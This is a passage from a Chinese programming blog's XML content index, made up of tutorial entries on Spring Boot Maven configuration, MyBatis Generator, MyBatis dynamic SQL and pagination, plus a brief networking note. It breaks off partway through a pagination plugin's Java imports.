package命令，然后点击下方的run就将项目打包成jar包（初次打包会自动下载一些依赖）。打包完毕后可看到项目目录target文件夹下生成了一个jar文件： 生成jar包后，cd到target目录下，执行以下命令： 访问http://localhost:8080，效果如上。 聊聊pom.xml 打开pom.xml可看到配置如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.springboot&lt;/groupId&gt; &lt;artifactId&gt;demo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;demo&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.7&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; spring-boot-starter-parent spring-boot-starter-parent指定了当前项目为一个Spring Boot项目，它提供了诸多的默认Maven依赖，这里仅截取一小部分： 1234567891011121314151617181920212223&lt;properties&gt;... &lt;spring-security.version&gt;4.2.3.RELEASE&lt;/spring-security.version&gt; &lt;spring-security-jwt.version&gt;1.0.8.RELEASE&lt;/spring-security-jwt.version&gt; &lt;spring-security-oauth.version&gt;2.0.14.RELEASE&lt;/spring-security-oauth.version&gt; &lt;spring-session.version&gt;1.3.1.RELEASE&lt;/spring-session.version&gt; &lt;spring-social.version&gt;1.1.4.RELEASE&lt;/spring-social.version&gt; &lt;spring-social-facebook.version&gt;2.0.3.RELEASE&lt;/spring-social-facebook.version&gt; &lt;spring-social-linkedin.version&gt;1.0.2.RELEASE&lt;/spring-social-linkedin.version&gt; &lt;spring-social-twitter.version&gt;1.1.2.RELEASE&lt;/spring-social-twitter.version&gt; &lt;spring-ws.version&gt;2.4.2.RELEASE&lt;/spring-ws.version&gt; &lt;sqlite-jdbc.version&gt;3.15.1&lt;/sqlite-jdbc.version&gt; &lt;statsd-client.version&gt;3.1.0&lt;/statsd-client.version&gt; &lt;sun-mail.version&gt;$&#123;javax-mail.version&#125;&lt;/sun-mail.version&gt; &lt;thymeleaf.version&gt;2.1.6.RELEASE&lt;/thymeleaf.version&gt; &lt;thymeleaf-extras-springsecurity4.version&gt;2.1.3.RELEASE&lt;/thymeleaf-extras-springsecurity4.version&gt; &lt;thymeleaf-extras-conditionalcomments.version&gt;2.1.2.RELEASE&lt;/thymeleaf-extras-conditionalcomments.version&gt; &lt;thymeleaf-layout-dialect.version&gt;1.4.0&lt;/thymeleaf-layout-dialect.version&gt; &lt;thymeleaf-extras-data-attribute.version&gt;1.3&lt;/thymeleaf-extras-data-attribute.version&gt; &lt;thymeleaf-extras-java8time.version&gt;2.1.0.RELEASE&lt;/thymeleaf-extras-java8time.version&gt; &lt;tomcat.version&gt;8.5.23&lt;/tomcat.version&gt;... &lt;/properties&gt; 需要说明的是，并非所有在&lt;properties&gt;标签中配置了版本号的依赖都有被启用，其启用与否取决于您是否配置了相应的starter。比如tomcat这个依赖就是spring-boot-starter-web的传递性依赖（下面将会描述到）。 当然，我们可以手动改变这些依赖的版本。比如我想把thymeleaf的版本改为3.0.0.RELEASE，我们可以在pom.xml中进行如下配置： 123&lt;properties&gt; &lt;thymeleaf.version&gt;3.0.0.RELEASE&lt;/thymeleaf.version&gt;&lt;/properties&gt; spring-boot-starter-web Spring Boot提供了许多开箱即用的依赖模块，这些模块都是以spring-boot-starter-XX命名的。比如要开启Spring Boot的web功能，只需要在pom.xml中配置spring-boot-starter-web即可： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 因为其依赖于spring-boot-starter-parent，所以这里可以不用配置version。保存后Maven会自动帮我们下载spring-boot-starter-web模块所包含的jar文件。如果需要具体查看spring-boot-starter-web包含了哪些依赖，我们可以右键项目选择run as → Maven Build…，在Goals中输入命令dependency:tree，然后点击run即可在eclipse控制台查看到如下信息： 1234567891011121314151617181920212223242526272829[INFO] +- org.springframework.boot:spring-boot-starter-web:jar:1.5.9.RELEASE:compile[INFO] | +- org.springframework.boot:spring-boot-starter:jar:1.5.9.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot:jar:1.5.9.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot-autoconfigure:jar:1.5.9.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot-starter-logging:jar:1.5.9.RELEASE:compile[INFO] | | | +- ch.qos.logback:logback-classic:jar:1.1.11:compile[INFO] | | | | \- ch.qos.logback:logback-core:jar:1.1.11:compile[INFO] | | | +- org.slf4j:jcl-over-slf4j:jar:1.7.25:compile[INFO] | | | +- org.slf4j:jul-to-slf4j:jar:1.7.25:compile[INFO] | | | \- org.slf4j:log4j-over-slf4j:jar:1.7.25:compile[INFO] | | \- org.yaml:snakeyaml:jar:1.17:runtime[INFO] | +- org.springframework.boot:spring-boot-starter-tomcat:jar:1.5.9.RELEASE:compile[INFO] | | +- org.apache.tomcat.embed:tomcat-embed-core:jar:8.5.23:compile[INFO] | | | \- org.apache.tomcat:tomcat-annotations-api:jar:8.5.23:compile[INFO] | | +- org.apache.tomcat.embed:tomcat-embed-el:jar:8.5.23:compile[INFO] | | \- org.apache.tomcat.embed:tomcat-embed-websocket:jar:8.5.23:compile[INFO] | +- org.hibernate:hibernate-validator:jar:5.3.6.Final:compile[INFO] | | +- javax.validation:validation-api:jar:1.1.0.Final:compile[INFO] | | +- org.jboss.logging:jboss-logging:jar:3.3.1.Final:compile[INFO] | | \- com.fasterxml:classmate:jar:1.3.4:compile[INFO] | +- com.fasterxml.jackson.core:jackson-databind:jar:2.8.10:compile[INFO] | | +- com.fasterxml.jackson.core:jackson-annotations:jar:2.8.0:compile[INFO] | | \- com.fasterxml.jackson.core:jackson-core:jar:2.8.10:compile[INFO] | +- org.springframework:spring-web:jar:4.3.13.RELEASE:compile[INFO] | | +- org.springframework:spring-aop:jar:4.3.13.RELEASE:compile[INFO] | | +- org.springframework:spring-beans:jar:4.3.13.RELEASE:compile[INFO] | | \- org.springframework:spring-context:jar:4.3.13.RELEASE:compile[INFO] | \- org.springframework:spring-webmvc:jar:4.3.13.RELEASE:compile[INFO] | \- org.springframework:spring-expression:jar:4.3.13.RELEASE:compile 上述这些依赖都是隐式依赖于spring-boot-starter-web，我们也可以手动排除一些我们不需要的依赖。 比如spring-boot-starter-web默认集成了tomcat，假如我们想把它换为jetty，可以在pom.xml中spring-boot-starter-web下排除tomcat依赖，然后手动引入jetty依赖： 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jetty&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; tips：依赖的坐标可以到上述的spring-boot-dependencies-1.5.9.RELEASE.pom文件里查找。再次运行dependency:tree： 123456789101112131415161718192021222324252627282930[INFO] +- org.springframework.boot:spring-boot-starter-web:jar:1.5.9.RELEASE:compile...[INFO] +- org.springframework.boot:spring-boot-starter-jetty:jar:1.5.9.RELEASE:compile[INFO] | +- org.eclipse.jetty:jetty-servlets:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty:jetty-continuation:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty:jetty-http:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty:jetty-util:jar:9.4.7.v20170914:compile[INFO] | | \- org.eclipse.jetty:jetty-io:jar:9.4.7.v20170914:compile[INFO] | +- org.eclipse.jetty:jetty-webapp:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty:jetty-xml:jar:9.4.7.v20170914:compile[INFO] | | \- org.eclipse.jetty:jetty-servlet:jar:9.4.7.v20170914:compile[INFO] | | \- org.eclipse.jetty:jetty-security:jar:9.4.7.v20170914:compile[INFO] | | \- org.eclipse.jetty:jetty-server:jar:9.4.7.v20170914:compile[INFO] | +- org.eclipse.jetty.websocket:websocket-server:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty.websocket:websocket-common:jar:9.4.7.v20170914:compile[INFO] | | | \- org.eclipse.jetty.websocket:websocket-api:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty.websocket:websocket-client:jar:9.4.7.v20170914:compile[INFO] | | | \- org.eclipse.jetty:jetty-client:jar:9.4.7.v20170914:compile[INFO] | | \- org.eclipse.jetty.websocket:websocket-servlet:jar:9.4.7.v20170914:compile[INFO] | | \- javax.servlet:javax.servlet-api:jar:3.1.0:compile[INFO] | +- org.eclipse.jetty.websocket:javax-websocket-server-impl:jar:9.4.7.v20170914:compile[INFO] | | +- org.eclipse.jetty:jetty-annotations:jar:9.4.7.v20170914:compile[INFO] | | | +- org.eclipse.jetty:jetty-plus:jar:9.4.7.v20170914:compile[INFO] | | | +- javax.annotation:javax.annotation-api:jar:1.2:compile[INFO] | | | +- org.ow2.asm:asm:jar:5.1:compile[INFO] | | | \- org.ow2.asm:asm-commons:jar:5.1:compile[INFO] | | | \- org.ow2.asm:asm-tree:jar:5.1:compile[INFO] | | +- org.eclipse.jetty.websocket:javax-websocket-client-impl:jar:9.4.7.v20170914:compile[INFO] | | \- javax.websocket:javax.websocket-api:jar:1.0:compile[INFO] | \- org.mortbay.jasper:apache-el:jar:8.0.33:compile 可看到tomcat已被替换为了jetty。 spring-boot-maven-plugin spring-boot-maven-plugin为Spring Boot Maven插件，提供了： 把项目打包成一个可执行的超级JAR（uber-JAR）,包括把应用程序的所有依赖打入JAR文件内，并为JAR添加一个描述文件，其中的内容能让你用java -jar来运行应用程序。 搜索public static void main()方法来标记为可运行类。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>pom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[物理层]]></title>
    <url>%2F2018%2F05%2F01%2F%E7%89%A9%E7%90%86%E5%B1%82%2F</url>
    <content type="text"><![CDATA[通信方式根据信息在传输线上的传送方向，可分为以下三种通信方式： 单工通信：单向传输 半双工通信：双向交替传输 全双工通信：双向同时传输 带通调制模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>物理层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis代码生成工具]]></title>
    <url>%2F2018%2F03%2F19%2FMybatis%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[代码生成工具的使用Mybatis 应用程序，需要大量的配置文件，对于一个成百上千的数据库表来说，完全手工配置，这是一个很恐怖的工作量. 所以 Mybatis 官方也推出了一个 Mybatis 代码生成工具的 jar 包. 今天花了一点时间，按照 Mybatis generator 的 doc 文档参考，初步配置出了一个可以使用的版本，我把源代码也提供下载,Mybatis 代码生成工具，主要有一下功能: 生成 pojo 与 数据库结构对应 如果有主键，能匹配主键 如果没有主键，可以用其他字段去匹配 动态 select,update,delete 方法 自动生成接口(也就是以前的 dao 层) 自动生成 sql mapper，增删改查各种语句配置，包括动态 where 语句配置 生成 Example 例子供参考 下面介绍下详细过程 创建测试工程,并配置 Mybatis 代码生成 jar 包下载地址:http://code.google.com/p/mybatis/downloads/list?can=3&amp;q=Product%3DGenerator MySql 驱动下载:http://dev.mysql.com/downloads/connector/j/ 这些 jar 包，我也会包含在源代码里面，可以在文章末尾处，下载源代码，参考。 用 Eclipse 建立一个 dynamic web project。 解压下载后的 mybatis-generator-core-1.3.2-bundle.zip 文件，其中有两个目录：一个目录是文档目录docs，主要介绍这个代码生成工具如何使用，另一个是 lib 目录，里面的内容主要是 jar 包，这里我们需要 mybatis-generator-core-1.3.2.jar，这个 jar 包. 将它拷贝到我们刚刚创建的 web工程的 WebContent/WEB-INF/lib 目录下.在这个目录下也放入 MySql 驱动 jar 包。因为用 MySql 做测试的。 在数据库中创建测试表在 Mybatis 数据库中创建 用来测试的 category 表(如果没有 Mybatis 这个数据库,要创建，这是基于前面这个系列文章而写的，已经有了 Mybatis 这个数据库) 1234567Drop TABLE IF EXISTS `category`;Create TABLE `category` ( `id` int(11) NOT NULL AUTO_INCREMENT, `catname` varchar(50) NOT NULL, `catdescription` varchar(200) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; 配置 Mybatis 代码生成工具的配置文件在创建的 Web 工程中，创建相应的 package 比如 : com.yihaomen.inter 用来存放 Mybatis 接口对象。 com.yihaomen.mapper 用来存放 sql mapper 对应的映射，sql 语句等。 com.yihaomen.model 用来存放与数据库对应的 model 。 在用 Mybatis 代码生成工具之前，这些目录必须先创建好，作为一个好的应用程序，这些目录的创建也是有规律的。 根据 Mybatis 代码生成工具文档，需要一个配置文件，这里命名为:mbgConfiguration.xml放在 src 目录下. 配置文件内容如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN" "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;&lt;generatorConfiguration&gt; &lt;!-- 配置mysql 驱动jar包路径.用了绝对路径 --&gt; &lt;classPathEntry location="D:\Work\Java\eclipse\workspace\myBatisGenerator\WebContent\WEB-INF\lib\mysql-connector-java-5.1.22-bin.jar" /&gt; &lt;context id="yihaomen_mysql_tables" targetRuntime="MyBatis3"&gt; &lt;!-- 为了防止生成的代码中有很多注释，比较难看，加入下面的配置控制 --&gt; &lt;commentGenerator&gt; &lt;property name="suppressAllComments" value="true" /&gt; &lt;property name="suppressDate" value="true" /&gt; &lt;/commentGenerator&gt; &lt;!-- 注释控制完毕 --&gt; &lt;!-- 数据库连接 --&gt; &lt;jdbcConnection driverClass="com.mysql.jdbc.Driver" connectionURL="jdbc:mysql://127.0.0.1:3306/mybatis?characterEncoding=utf8" userId="root" password="password"&gt; &lt;/jdbcConnection&gt; &lt;javaTypeResolver &gt; &lt;property name="forceBigDecimals" value="false" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- 数据表对应的model 层 --&gt; &lt;javaModelGenerator targetPackage="com.yihaomen.model" targetProject="src"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;property name="trimStrings" value="true" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- sql mapper 隐射配置文件 --&gt; &lt;sqlMapGenerator targetPackage="com.yihaomen.mapper" targetProject="src"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- 在ibatis2 中是dao层，但在mybatis3中，其实就是mapper接口 --&gt; &lt;javaClientGenerator type="XMLMAPPER" targetPackage="com.yihaomen.inter" targetProject="src"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- 要对那些数据表进行生成操作，必须要有一个. --&gt; &lt;table schema="mybatis" tableName="category" domainObjectName="Category" enableCountByExample="false" enableUpdateByExample="false" enableDeleteByExample="false" enableSelectByExample="false" selectByExampleQueryId="false"&gt; &lt;/table&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 用一个 main 方法来测试能否用 Mybatis 成生成刚刚创建的category表对应的 model,sql mapper 等内容。 创建一个 com.yihaomen.test 的 package ,并在此 package 下面建立一个测试的类 GenMain： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.yihaomen.test;import java.io.File;import java.io.IOException;import java.sql.SQLException;import java.util.ArrayList;import java.util.List;import org.mybatis.generator.api.MyBatisGenerator;import org.mybatis.generator.config.Configuration;import org.mybatis.generator.config.xml.ConfigurationParser;import org.mybatis.generator.exception.InvalidConfigurationException;import org.mybatis.generator.exception.XMLParserException;import org.mybatis.generator.internal.DefaultShellCallback;public class GenMain &#123; public static void main(String[] args) &#123; List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; String genCfg = "/mbgConfiguration.xml"; File configFile = new File(GenMain.class.getResource(genCfg).getFile()); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = null; try &#123; config = cp.parseConfiguration(configFile); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (XMLParserException e) &#123; e.printStackTrace(); &#125; DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = null; try &#123; myBatisGenerator = new MyBatisGenerator(config, callback, warnings); &#125; catch (InvalidConfigurationException e) &#123; e.printStackTrace(); &#125; try &#123; myBatisGenerator.generate(null); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 到此为止,Eclipse 项目工程图应该如下: 运行测试的 main 方法,生成 Mybatis 相关代码运行 GenMain 类里的 main方法，并刷新工程,你会发现 各自 package 目录下已经响应生成了对应的文件，完全符合 Mybatis 规则，效果图如下: 注意事项如果你想生成 example 之类的东西，需要在&lt;table&gt;&lt;/table&gt;里面去掉 123enableCountByExample="false" enableUpdateByExample="false"enableDeleteByExample="false" enableSelectByExample="false"selectByExampleQueryId="false" 这部分配置，这是生成 example 而用的，一般来说对项目没有用。 另外生成的 sql mapper 等，只是对单表的增删改查，如果你有多表 join 操作，你就可以手动配置，如果调用存储过程，你也需要手工配置. 这时工作量已经少很多了。 如果你想用命令行方式处理，也是可以的。 比如: 1java -jar mybatis-generator-core-1.3.2.jar -mbgConfiguration.xm -overwrite 这时，要用绝对路径才行. 另外 mbgConfiguration.xml 配置文件中 targetProject 的配置也必须是绝对路径了。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>自动生成代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis动态SQL]]></title>
    <url>%2F2018%2F03%2F16%2FMybatis%E5%8A%A8%E6%80%81SQL%2F</url>
    <content type="text"><![CDATA[Mybatis 动态 SQL 语句基础Mybatis 的动态 SQL 语句是基于 OGNL 表达式的。可以方便的在 SQL 语句中实现某些逻辑. 总体说来 Mybatis 动态 SQL 语句主要有以下几类: if 语句 (简单的条件判断) choose (when,otherwize) ,相当于java 语言中的 switch ,与 jstl 中的choose 很类似. trim (对包含的内容加上 prefix,或者 suffix 等，前缀，后缀) where (主要是用来简化 sql 语句中 where 条件判断的，能智能的处理 and or ,不必担心多余导致语法错误) set (主要用于更新时) foreach (在实现 mybatis in 语句查询时特别有用) 下面分别介绍这几种处理方式 mybaits if 语句处理123456789101112&lt;select id="dynamicIfTest" parameterType="Blog" resultType="Blog"&gt; select * from t_blog where 1 = 1 &lt;if test="title != null"&gt; and title = #&#123;title&#125; &lt;/if&gt; &lt;if test="content != null"&gt; and content = #&#123;content&#125; &lt;/if&gt; &lt;if test="owner != null"&gt; and owner = #&#123;owner&#125; &lt;/if&gt; &lt;/select&gt; 这条语句的意思非常简单，如果你提供了 title 参数，那么就要满足 title=#{title}，同样如果你提供了 Content 和 Owner 的时候，它们也需要满足相应的条件，之后就是返回满足这些条件的所有 Blog，这是非常有用的一个功能，以往我们使用其他类型框架或者直接使用 JDBC 的时候， 如果我们要达到同样的选择效果的时候，我们就需要拼 SQL 语句，这是极其麻烦的，比起来，上述的动态 SQL 就要简单多了。 choose(when,otherwize) ,相当于 Java 语言中的 switch ,与 jstl 中的choose 很类似 1234567891011121314&lt;select id="dynamicChooseTest" parameterType="Blog" resultType="Blog"&gt; select * from t_blog where 1 = 1 &lt;choose&gt; &lt;when test="title != null"&gt; and title = #&#123;title&#125; &lt;/when&gt; &lt;when test="content != null"&gt; and content = #&#123;content&#125; &lt;/when&gt; &lt;otherwise&gt; and owner = "owner1" &lt;/otherwise&gt; &lt;/choose&gt; &lt;/select&gt; when 元素表示当 when 中的条件满足的时候就输出其中的内容，跟 Java 中的 switch 效果差不多的是按照条件的顺序，当 when 中有条件满足的时候，就会跳出 choose，即所有的 when 和 otherwise 条件中，只有一个会输出，当所有的我很条件都不满足的时候就输出 otherwise 中的内容。所以上述语句的意思非常简单， 当 title!=null 的时候就输出 and titlte = #{title}，不再往下判断条件，当 title 为空且 content!=null 的时候就输出 and content = #{content}，当所有条件都不满足的时候就输出 otherwise 中的内容。 trim对包含的内容加上 prefix,或者 suffix 等，前缀，后缀 1234567891011121314&lt;select id="dynamicTrimTest" parameterType="Blog" resultType="Blog"&gt; select * from t_blog &lt;trim prefix="where" prefixOverrides="and |or"&gt; &lt;if test="title != null"&gt; title = #&#123;title&#125; &lt;/if&gt; &lt;if test="content != null"&gt; and content = #&#123;content&#125; &lt;/if&gt; &lt;if test="owner != null"&gt; or owner = #&#123;owner&#125; &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; trim 元素的主要功能是可以在自己包含的内容前加上某些前缀，也可以在其后加上某些后缀，与之对应的属性是 prefix 和 suffix；可以把包含内容的首部某些内容覆盖，即忽略，也可以把尾部的某些内容覆盖，对应的属性是 prefixOverrides 和 suffixOverrides；正因为 trim 有这样的功能，所以我们也可以非常简单的利用 trim 来代替 where 元素的功能。 where主要是用来简化 SQL 语句中 where 条件判断的，能智能的处理 and or 条件 1234567891011121314&lt;select id="dynamicWhereTest" parameterType="Blog" resultType="Blog"&gt; select * from t_blog &lt;where&gt; &lt;if test="title != null"&gt; title = #&#123;title&#125; &lt;/if&gt; &lt;if test="content != null"&gt; and content = #&#123;content&#125; &lt;/if&gt; &lt;if test="owner != null"&gt; and owner = #&#123;owner&#125; &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; where 元素的作用是会在写入 where 元素的地方输出一个 where，另外一个好处是你不需要考虑 where 元素里面的条件输出是什么样子的，MyBatis 会智能的帮你处理，如果所有的条件都不满足那么 MyBatis 就会查出所有的记录，如果输出后是 and 开头的，MyBatis 会把第一个 and 忽略，当然如果是 or 开头的，MyBatis 也会把它忽略；此外，在 where 元素中你不需要考虑空格的问题，MyBatis 会智能的帮你加上。像上述例子中，如果 title=null， 而 content != null，那么输出的整个语句会是 select * from t_blog where content = #{content}，而不是select * from t_blog where and content = #{content}，因为 MyBatis 会智能的把首个 and 或 or 给忽略。 set主要用于更新时 123456789101112131415&lt;update id="dynamicSetTest" parameterType="Blog"&gt; update t_blog &lt;set&gt; &lt;if test="title != null"&gt; title = #&#123;title&#125;, &lt;/if&gt; &lt;if test="content != null"&gt; content = #&#123;content&#125;, &lt;/if&gt; &lt;if test="owner != null"&gt; owner = #&#123;owner&#125; &lt;/if&gt; &lt;/set&gt; where id = #&#123;id&#125; &lt;/update&gt; set 元素主要是用在更新操作的时候，它的主要功能和 where 元素其实是差不多的，主要是在包含的语句前输出一个set，然后如果包含的语句是以逗号结束的话将会把该逗号忽略，如果 set 包含的内容为空的话则会出错。有了 set 元素我们就可以动态的更新那些修改了的字段。 foreach在实现 mybatis in 语句查询时特别有用 foreach 的主要用在构建 in 条件中，它可以在 SQL 语句中进行迭代一个集合。foreach 元素的属性主要有 item，index，collection，open，separator，close。item 表示集合中每一个元素进行迭代时的别名，index指定一个名字，用于表示在迭代过程中，每次迭代到的位置，open 表示该语句以什么开始，separator表示在每次进行迭代之间以什么符号作为分隔符，close 表示以什么结束，在使用 foreach 的时候最关键的也是最容易出错的就是 collection 属性，该属性是必须指定的，但是在不同情况下，该属性的值是不一样的，主要有一下 3 种情况： 如果传入的是单参数且参数类型是一个 List 的时候，collection 属性值为 list 如果传入的是单参数且参数类型是一个 array 数组的时候，collection 的属性值为 array 如果传入的参数是多个的时候，我们就需要把它们封装成一个 Map 了，当然单参数也可以封装成 map，实际上如果你在传入参数的时候，在 MyBatis 里面也是会把它封装成一个 Map 的，map 的 key 就是参数名，所以这个时候 collection 属性值就是传入的 List 或 array 对象在自己封装的 map 里面的 key 单参数 List 的类型123456&lt;select id="dynamicForeachTest" resultType="Blog"&gt; select * from t_blog where id in &lt;foreach collection="list" index="index" item="item" open="(" separator="," close=")"&gt; #&#123;item&#125; &lt;/foreach&gt; &lt;/select&gt; 上述 collection 的值为 list，对应的 Mapper 是这样的 1public List&lt;Blog&gt; dynamicForeachTest(List&lt;Integer&gt; ids); 测试代码 12345678910111213@Test public void dynamicForeachTest() &#123; SqlSession session = Util.getSqlSessionFactory().openSession(); BlogMapper blogMapper = session.getMapper(BlogMapper.class); List&lt;Integer&gt; ids = new ArrayList&lt;Integer&gt;(); ids.add(1); ids.add(3); ids.add(6); List&lt;Blog&gt; blogs = blogMapper.dynamicForeachTest(ids); for (Blog blog : blogs) System.out.println(blog); session.close(); &#125; 数组类型的参数123456&lt;select id="dynamicForeach2Test" resultType="Blog"&gt; select * from t_blog where id in &lt;foreach collection="array" index="index" item="item" open="(" separator="," close=")"&gt; #&#123;item&#125; &lt;/foreach&gt; &lt;/select&gt; 对应 mapper 1public List&lt;Blog&gt; dynamicForeach2Test(int[] ids); Map 类型的参数123456&lt;select id="dynamicForeach3Test" resultType="Blog"&gt; select * from t_blog where title like "%"#&#123;title&#125;"%" and id in &lt;foreach collection="ids" index="index" item="item" open="(" separator="," close=")"&gt; #&#123;item&#125; &lt;/foreach&gt;&lt;/select&gt; mapper 应该是这样的接口: 1public List&lt;Blog&gt; dynamicForeach3Test(Map&lt;String, Object&gt; params);]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>动态SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis分页]]></title>
    <url>%2F2018%2F03%2F16%2FMybatis%E5%88%86%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[实现 Mybatis 分页上一篇文章里已经讲到了 Mybatis与 Spring MVC 的集成，并且做了一个列表展示，显示出所有 article 列表，但没有用到分页，在实际的项目中，分页是肯定需要的。而且是物理分页，不是内存分页。对于物理分页方案，不同的数据库，有不同的实现方法,对于 Mysql 来说 就是利用 limit offset,pagesize 方式来实现的。oracle 是通过 rownum 来实现的，如果你熟悉相关数据库的操作，是一样的很好扩展，本文以 Mysql 为例子来讲述。先看一下效果图(源代码在文章最后提供下载): 实现 Mybatis 物理分页，一个最简单的方式是，是在你的 mapper 的 SQL 语句中直接写类似如下方式 : 1234&lt;select id="getUserArticles" parameterType="Your_params" resultMap="resultUserArticleList"&gt; select user.id,user.userName,user.userAddress,article.id aid,article.title,article.content from user,article where user.id=article.userid and user.id=#&#123;id&#125; limit #&#123;offset&#125;,#&#123;pagesize&#125; &lt;/select&gt; 请注意这里的 parameterType 是你传入的参数类，或者map ，里面包含了 offset,pagesize ,和其他你需要的参数，用这种方式，肯定可以实现分页。这是简单的一种方式。但更通用的一种方式是用 mybatis 插件的方式. 参考了网上的很多资料 ，mybatis plugin 方面的资料。写自己的插件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216package com.yihaomen.util;import java.lang.reflect.Field;import java.sql.Connection;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.sql.SQLException;import java.util.List;import java.util.Map;import java.util.Properties;import javax.xml.bind.PropertyException;import org.apache.ibatis.builder.xml.dynamic.ForEachSqlNode;import org.apache.ibatis.executor.ErrorContext;import org.apache.ibatis.executor.Executor;import org.apache.ibatis.executor.ExecutorException;import org.apache.ibatis.executor.statement.BaseStatementHandler;import org.apache.ibatis.executor.statement.RoutingStatementHandler;import org.apache.ibatis.executor.statement.StatementHandler;import 